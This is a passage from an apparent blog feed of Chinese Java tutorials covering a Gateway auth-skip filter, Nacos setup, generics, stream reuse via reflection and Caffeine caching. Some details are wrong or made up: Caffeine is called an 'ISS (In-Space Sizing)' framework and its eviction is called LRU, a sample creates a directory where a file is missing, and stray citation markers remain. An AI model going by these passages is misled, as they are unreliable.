<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IgnoreAuthFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;auth.ignore&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; ignorePaths;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequest().getPath().value();</span><br><span class="line">        <span class="keyword">if</span> (ignorePaths.contains(path)) &#123;</span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TokenValidationFilter</span>().filter(exchange, chain);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">2</span>; <span class="comment">// 过滤器执行顺序</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而且要特别注意过滤器的执行顺序，以保证功能的正常运行。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud分布式功能二【Nacos注册中心】</title>
    <url>/cnblogs.github.io/p/8f6.html</url>
    <content><![CDATA[<p>Spring Boot3 连接 Nacos 注册中心全攻略</p>
<blockquote>
<p><strong>连接 Nacos 注册中心前的准备</strong></p>
</blockquote>
<p><strong>运行 Nacos 服务</strong><br>要使用 Nacos，首先得让它跑起来。你可以通过多种方式运行 Nacos，比如从官网下载安装包解压后，使用命令行启动。如果是在开发环境，用 docker 来安装运行 Nacos 就非常便捷。在浏览器中访问 Nacos 的控制台地址（如<a href="http://localhost:8848/nacos">http://localhost:8848/nacos</a> ），输入初始用户名和密码（默认 nacos&#x2F;nacos），登录成功后，我们还需要做一些初始化配置。比如创建一个命名空间，不同的命名空间可以隔离不同环境或业务线的服务。接着，根据业务需求，新建一些配置，为后续服务注册和配置管理做准备。</p>
<p><strong>Spring Boot 项目依赖添加</strong><br>在我们的 Spring Boot3 项目中，需要引入 Nacos 相关的依赖。打开项目的 pom.xml 文件，添加如下依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个依赖包提供了 Spring Boot 与 Nacos 集成的基础功能，让我们的 Spring Boot 应用能够轻松与 Nacos 注册中心交互。</p>
<blockquote>
<p><strong>Spring Boot3 项目连接 Nacos 注册中心</strong></p>
</blockquote>
<p>**配置 Nacos 连接信息<br>在 Spring Boot 项目的配置文件中，通常是 bootstrap.properties 或 bootstrap.yml，添加 Nacos 的连接配置。假设 Nacos 运行在本地，配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring.application.name=your-application-name</span><br><span class="line">spring.cloud.nacos.server-addr=127.0.0.1:8848</span><br><span class="line">spring.cloud.nacos.discovery.username=nacos</span><br><span class="line">spring.cloud.nacos.discovery.password=nacos</span><br><span class="line">spring.cloud.nacos.discovery.namespace=your-namespace-id</span><br></pre></td></tr></table></figure>
<p>这里，spring.application.name 指定了你的应用名称，这在 Nacos 控制台中会显示，方便区分不同服务。spring.cloud.nacos.server - addr 是 Nacos 服务器的地址和端口。username 和 password 是登录 Nacos 控制台的账号密码。namespace 则是之前创建的命名空间 ID，确保服务注册到正确的空间下。如果你的项目需要在不同环境（开发、测试、生产）中切换 Nacos 地址等配置，还可以通过命令行参数来动态赋值，例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar your-application.jar --spring.cloud.nacos.server-addr=test -nacos-server:8848</span><br></pre></td></tr></table></figure>

<p><strong>启用服务发现功能</strong><br>在 Spring Boot 应用的主配置类，也就是带有 @SpringBootApplication 注解的类上，添加 @EnableDiscoveryClient 注解，开启 Nacos 服务发现功能。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.client.discovery.EnableDiscoveryClient;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YourApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(YourApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，当 Spring Boot 应用启动时，就会自动将自身服务信息注册到 Nacos 注册中心。在 Nacos 控制台的服务列表中，就能看到你的服务了，并且可以查看服务的实例信息，包括 IP、端口等。</p>
<p><strong>进阶功能：Nacos 动态配置使用</strong><br>Nacos 不仅仅能做服务注册与发现，还提供了强大的动态配置管理功能。在 Spring Boot 项目中使用 Nacos 动态配置也很简单。</p>
<p><strong>添加配置文件</strong><br>在 Nacos 控制台的配置管理模块，创建一个配置文件。比如，我们创建一个名为 application.properties 的配置文件，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your.config.key=your-config-value</span><br></pre></td></tr></table></figure>

<p><strong>项目中配置 Nacos 动态配置</strong><br>在 Spring Boot 项目的 bootstrap.properties 或 bootstrap.yml 中，添加如下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring.application.name=your-application-name</span><br><span class="line">spring.cloud.nacos.config.server-addr=127.0.0.1:8848</span><br><span class="line">spring.cloud.nacos.config.file-extension=properties</span><br><span class="line">spring.cloud.nacos.config.shared-data-ids=application.properties</span><br><span class="line">spring.cloud.nacos.config.refreshable-data-ids=application.properties</span><br></pre></td></tr></table></figure>
<p>这里，spring.cloud.nacos.config.file-extension 指定了配置文件的类型，shared-data-ids 和 refreshable-data-ids 都指定了需要从 Nacos 获取的配置文件名称。</p>
<p><strong>使用动态配置</strong><br>在 Spring Boot 项目的代码中，通过 @Value 注解来获取配置值，并且使用 @RefreshScope 注解实现配置的自动更新。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.context.config.annotation.RefreshScope;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RefreshScope</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigController</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;your.config.key&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String configValue;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/config&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> configValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当在 Nacos 控制台修改了 application.properties 文件中的 your.config.key 的值后，无需重启 Spring Boot 应用，再次访问 &#x2F;config 接口，就能获取到最新的配置值。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>Java功能一【泛型通配符T/E/K/V解析】</title>
    <url>/cnblogs.github.io/p/20873.html</url>
    <content><![CDATA[<h4 id="T（Type）：万能替身演员"><a href="#T（Type）：万能替身演员" class="headerlink" title="T（Type）：万能替身演员"></a>T（Type）：万能替身演员</h4><p>作为泛型的“门面担当”，T在类、方法、接口中扮演任意类型的占位符：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 泛型类：盒子能装任何类型的物品  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MagicBox</span>&lt;T&gt; &#123;  </span><br><span class="line">    <span class="keyword">private</span> T secret;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">store</span><span class="params">(T item)</span> &#123; <span class="built_in">this</span>.secret = item; &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 使用时指定具体类型  </span></span><br><span class="line">MagicBox&lt;String&gt; wordBox = <span class="keyword">new</span> <span class="title class_">MagicBox</span>&lt;&gt;();  </span><br><span class="line">wordBox.store(<span class="string">&quot;Hello Generics!&quot;</span>);  <span class="comment">// 编译期自动类型检查[1,5](@ref)  </span></span><br></pre></td></tr></table></figure>
<p><strong>核心价值：</strong></p>
<ul>
<li>消除强制转换（告别(String)list.get(0)的提心吊胆）</li>
<li>防止ClassCastException（错误在编译期就被拦截）</li>
</ul>
<h4 id="E（Element）：集合家族的专属身份证"><a href="#E（Element）：集合家族的专属身份证" class="headerlink" title="E（Element）：集合家族的专属身份证"></a>E（Element）：集合家族的专属身份证</h4><p>当你在List<E>或Set<E>中看到E，它专指集合元素类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeList</span>&lt;E&gt; &#123;  </span><br><span class="line">    <span class="keyword">private</span> List&lt;E&gt; data = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  </span><br><span class="line">    <span class="comment">// 确保存入/取出类型一致  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addElement</span><span class="params">(E e)</span> &#123; data.add(e); &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 使用时明确元素类型  </span></span><br><span class="line">SafeList&lt;Integer&gt; scores = <span class="keyword">new</span> <span class="title class_">SafeList</span>&lt;&gt;();  </span><br><span class="line">scores.addElement(<span class="number">95</span>);  <span class="comment">// 若尝试add(&quot;A+&quot;)会直接编译报错[3,4](@ref)  </span></span><br></pre></td></tr></table></figure>
<p><strong>设计哲学：</strong>让集合像“类型保险箱”，存入和取出保持类型一致性</p>
<h4 id="K-V（Key-Value）：映射关系的黄金搭档"><a href="#K-V（Key-Value）：映射关系的黄金搭档" class="headerlink" title="K&#x2F;V（Key&#x2F;Value）：映射关系的黄金搭档"></a>K&#x2F;V（Key&#x2F;Value）：映射关系的黄金搭档</h4><p>这对CP专为Map量身定制，定义键值对的类型约束：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigCache</span>&lt;K, V&gt; &#123;  </span><br><span class="line">    <span class="keyword">private</span> Map&lt;K, V&gt; cacheMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveConfig</span><span class="params">(K key, V value)</span> &#123;  </span><br><span class="line">        cacheMap.put(key, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 使用时明确键值类型  </span></span><br><span class="line">ConfigCache&lt;String, LocalDateTime&gt; timeCache = <span class="keyword">new</span> <span class="title class_">ConfigCache</span>&lt;&gt;();  </span><br><span class="line">timeCache.saveConfig(<span class="string">&quot;userLogin&quot;</span>, LocalDateTime.now());  </span><br></pre></td></tr></table></figure>
<p><strong>黄金法则：</strong></p>
<ul>
<li>K约束键的类型（如必须实现hashCode()）</li>
<li>V约束值的类型（如统一存储JSON对象</li>
</ul>
<h4 id="上界通配符：类型安全的“天花板”"><a href="#上界通配符：类型安全的“天花板”" class="headerlink" title="上界通配符：类型安全的“天花板”"></a>上界通配符：类型安全的“天花板”</h4><p>&lt;? extends T&gt;定义类型上限，常用于数据消费场景：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 处理所有动物及其子类（Cat/Dog）  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feedAnimals</span><span class="params">(List&lt;? extends Animal&gt; animals)</span> &#123;  </span><br><span class="line">    animals.forEach(Animal::eat);  <span class="comment">// 安全调用父类方法  </span></span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 可传入List&lt;Cat&gt;但不能传入List&lt;Object&gt;[4,5](@ref)  </span></span><br></pre></td></tr></table></figure>
<p><strong>优势：</strong> 保证集合元素至少具备父类特性</p>
<h4 id="下界通配符：类型系统的“地板”"><a href="#下界通配符：类型系统的“地板”" class="headerlink" title="下界通配符：类型系统的“地板”"></a>下界通配符：类型系统的“地板”</h4><p>&lt;? super T&gt;设定类型下限，适用于数据生产场景：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 向容器添加特定类型元素  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fillNumbers</span><span class="params">(List&lt;? <span class="built_in">super</span> Integer&gt; list)</span> &#123;  </span><br><span class="line">    list.add(<span class="number">42</span>);  <span class="comment">// 允许添加Integer及其父类容器  </span></span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 可传入List&lt;Number&gt;或List&lt;Object&gt;[4,5](@ref) </span></span><br></pre></td></tr></table></figure>
<p><strong>经典案例：</strong> Collections.copy(dest, src)方法实现</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java功能三【FileInputStream二次使用】</title>
    <url>/cnblogs.github.io/p/32689.html</url>
    <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InputStreamTest</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line"> </span><br><span class="line">         <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;F:\\HelloCoder-HaC.txt&quot;</span>;</span><br><span class="line">         <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileName);</span><br><span class="line">         <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">             file.mkdir();</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(fileName));</span><br><span class="line">         <span class="type">int</span> <span class="variable">by</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10</span>];</span><br><span class="line"> <span class="comment">//        一个字节数组的读出数据</span></span><br><span class="line"> <span class="comment">//        第一次读写  </span></span><br><span class="line">         <span class="keyword">while</span> ((by = fileInputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">             System.out.print((<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, by)));</span><br><span class="line">         &#125;</span><br><span class="line"> <span class="comment">//        //关闭流，这里关闭也不影响</span></span><br><span class="line">         fileInputStream.close();</span><br><span class="line"> </span><br><span class="line">         <span class="comment">//关闭流后如何打开，利用反射</span></span><br><span class="line">         System.out.println();</span><br><span class="line">         System.out.println(<span class="string">&quot;-------重新复用流-------&quot;</span>);</span><br><span class="line"> <span class="comment">//      第二次 重新读写</span></span><br><span class="line">         <span class="type">Class</span> <span class="variable">in</span> <span class="operator">=</span> fileInputStream.getClass();</span><br><span class="line">         <span class="type">Method</span> <span class="variable">openo</span> <span class="operator">=</span> in.getDeclaredMethod(<span class="string">&quot;open&quot;</span>, String.class);</span><br><span class="line">         <span class="comment">//因为是private</span></span><br><span class="line">         openo.setAccessible(<span class="literal">true</span>);</span><br><span class="line">         openo.invoke(fileInputStream, fileName);</span><br><span class="line">         bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10</span>];</span><br><span class="line">         <span class="keyword">while</span> ((by = fileInputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">             System.out.print((<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, by)));</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HelloCoder ,I am HaC</span><br><span class="line">My webSite is https://rain.baimuxym.cn</span><br><span class="line">-------重新复用流-------</span><br><span class="line">HelloCoder ,I am HaC</span><br><span class="line">My webSite is https://rain.baimuxym.cn</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java功能二【本地缓存Caffeine和Guava】</title>
    <url>/cnblogs.github.io/p/14281.html</url>
    <content><![CDATA[<h4 id="Caffeine"><a href="#Caffeine" class="headerlink" title="Caffeine"></a>Caffeine</h4><p>Caffeine 是一个性能ISS（In-Space Sizing）的缓存框架，它使用无锁算法和分段锁机制，以更优的方式优化了缓存淘汰算法。Caffeine 的设计目标为极致性能，并针对一些常见的场景进行了优化。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.ben-manes.caffeine<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>caffeine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.github.benmanes.caffeine.cache.*;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CompletableFuture;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CaffeineDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        basicUsageDemo();</span><br><span class="line">        loadingCacheDemo();</span><br><span class="line">        asyncLoadingCacheDemo();</span><br><span class="line">        evictionDemo();</span><br><span class="line">        statisticsDemo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 基础缓存操作示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">basicUsageDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 1. 基础缓存操作 ===&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        Cache&lt;String, String&gt; cache = Caffeine.newBuilder()</span><br><span class="line">            .expireAfterWrite(<span class="number">5</span>, TimeUnit.SECONDS) <span class="comment">// 写入5秒后过期</span></span><br><span class="line">            .maximumSize(<span class="number">100</span>)                     <span class="comment">// 最大100个条目</span></span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 手动写入</span></span><br><span class="line">        cache.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取值（不存在返回null）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> cache.getIfPresent(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取key1: &quot;</span> + value);  <span class="comment">// 输出: value1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取或计算（线程安全）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value2</span> <span class="operator">=</span> cache.get(<span class="string">&quot;key2&quot;</span>, k -&gt; <span class="string">&quot;computed-&quot;</span> + k);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取key2: &quot;</span> + value2); <span class="comment">// 输出: computed-key2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动加载缓存示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">loadingCacheDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 2. 自动加载缓存 ===&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        LoadingCache&lt;String, String&gt; cache = Caffeine.newBuilder()</span><br><span class="line">            .expireAfterAccess(<span class="number">3</span>, TimeUnit.SECONDS) <span class="comment">// 3秒未访问则过期</span></span><br><span class="line">            .maximumSize(<span class="number">10</span>)</span><br><span class="line">            .build(key -&gt; &#123;</span><br><span class="line">                <span class="comment">// 模拟从数据库加载</span></span><br><span class="line">                System.out.println(<span class="string">&quot;正在加载: &quot;</span> + key);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;db-value-&quot;</span> + key;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动触发加载函数</span></span><br><span class="line">        System.out.println(cache.get(<span class="string">&quot;user1001&quot;</span>)); <span class="comment">// 输出: db-value-user1001</span></span><br><span class="line">        System.out.println(cache.get(<span class="string">&quot;user1001&quot;</span>)); <span class="comment">// 第二次直接从缓存获取</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 异步加载缓存示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">asyncLoadingCacheDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 3. 异步加载缓存 ===&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        AsyncLoadingCache&lt;String, String&gt; cache = Caffeine.newBuilder()</span><br><span class="line">            .expireAfterWrite(<span class="number">10</span>, TimeUnit.SECONDS)</span><br><span class="line">            .maximumSize(<span class="number">1000</span>)</span><br><span class="line">            .buildAsync(key -&gt; &#123;</span><br><span class="line">                <span class="comment">// 模拟异步加载</span></span><br><span class="line">                <span class="keyword">return</span> CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;异步加载: &quot;</span> + key);</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;async-value-&quot;</span> + key;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 异步获取</span></span><br><span class="line">        cache.get(<span class="string">&quot;id123&quot;</span>).thenAccept(value -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;异步获取结果: &quot;</span> + value); <span class="comment">// 输出: async-value-id123</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 淘汰策略示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">evictionDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 4. 淘汰策略 ===&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        Cache&lt;String, String&gt; cache = Caffeine.newBuilder()</span><br><span class="line">            .maximumSize(<span class="number">3</span>) <span class="comment">// 测试用的小容量</span></span><br><span class="line">            .removalListener((key, value, cause) -&gt; </span><br><span class="line">                System.out.printf(<span class="string">&quot;淘汰事件: key=%s, 原因=%s\n&quot;</span>, key, cause))</span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">        cache.put(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;k2&quot;</span>, <span class="string">&quot;v2&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;k3&quot;</span>, <span class="string">&quot;v3&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;k4&quot;</span>, <span class="string">&quot;v4&quot;</span>); <span class="comment">// 触发淘汰（LRU）</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;当前大小: &quot;</span> + cache.estimatedSize()); <span class="comment">// 输出: 3</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 统计功能示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">statisticsDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 5. 统计功能 ===&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        Cache&lt;String, String&gt; cache = Caffeine.newBuilder()</span><br><span class="line">            .maximumSize(<span class="number">100</span>)</span><br><span class="line">            .recordStats() <span class="comment">// 开启统计</span></span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">        cache.put(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br><span class="line">        cache.getIfPresent(<span class="string">&quot;k1&quot;</span>);</span><br><span class="line">        cache.getIfPresent(<span class="string">&quot;missingKey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CacheStats</span> <span class="variable">stats</span> <span class="operator">=</span> cache.stats();</span><br><span class="line">        System.out.println(<span class="string">&quot;命中率: &quot;</span> + stats.hitRate());    <span class="comment">// 输出: 0.5</span></span><br><span class="line">        System.out.println(<span class="string">&quot;命中数: &quot;</span> + stats.hitCount());    <span class="comment">// 输出: 1</span></span><br><span class="line">        System.out.println(<span class="string">&quot;未命中数: &quot;</span> + stats.missCount()); <span class="comment">// 输出: 1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Guava-Cache"><a href="#Guava-Cache" class="headerlink" title="Guava Cache"></a>Guava Cache</h4><p>Guava Cache 是 Google 官方提供的一个缓存框架，它提供了许多高级特性，如自动加载、统计、序列化、并发控制等。与 Caffeine 不同，Guava Cache 的设计目标为简单易用，并支持更多的高级特性。</p>
